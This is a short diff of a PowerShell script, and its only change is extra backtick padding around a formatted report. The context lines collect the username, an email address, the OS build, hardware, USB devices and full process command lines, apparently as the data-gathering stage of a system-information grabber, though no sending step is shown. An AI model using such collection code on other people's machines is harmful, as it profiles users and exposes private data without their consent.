@@ -28,7 +28,7 @@ $systemString += "`nMemory : $RamInfo"
 $systemString += "`nGpu : $($videocardinfo.Name)"
 $systemString += "`nStorage : $Hddinfo"
 
-$infomessage = "``========================================================
+$infomessage = "``````========================================================
 
 Current User    : $env:USERNAME
 Email Address   : $email
@@ -40,7 +40,7 @@ Current OS      : $OSString
 Build           : $ver
 Hardware Info
 --------------------------------------------------------
-$systemString``"
+$systemString``````"
 
 $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
 $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
